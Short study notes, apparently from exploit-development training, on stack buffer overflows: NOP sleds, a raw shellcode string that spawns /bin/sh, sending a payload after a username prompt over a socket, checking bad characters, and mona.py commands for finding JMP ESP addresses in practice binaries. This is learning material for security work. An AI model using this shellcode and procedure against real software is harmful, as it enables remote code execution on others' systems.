# Buffer overfloww
The NOPs are instructions to do nothing, they will be skipped. It means that now, you don't need to get the exact address where your shell code start but any address in the NOPS, the program will skip all the NOPS and execute your shell code. That way if the memory shift a bit, your exploit will still work.

![](Buffer%20overfloww/image.png)

`Shell code for opening a shell: \x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05`

Read the stack or register RSP to find a suitable return address.

After s.connect, do `s.recv(1024)` (twice if error), and send the payload  
here we need to send username first and then press enter then payload,  
so we use `s.send(username + b'\r\n')` to enter new line  
then another message appears, so again `s.recv(1024)`

send badchars with the payload and right click on ESP and follow in dump to see if any of bad chars are removed  
or blurred  
`!mona modules` should give info about protections like DEP/ASLR,  
we're looking for falses in the binary

`!mona jmp -r esp -m gatekeeper.exe`

`!mona find -s "\xff\xe4 -m essfunc.dll(module)"` this is a jmp, esp use this to find address that can jump to malicious address  
  
search for address with black/bluish arrow at end of ribbon  
press f2 to set breakpoint at selected memory address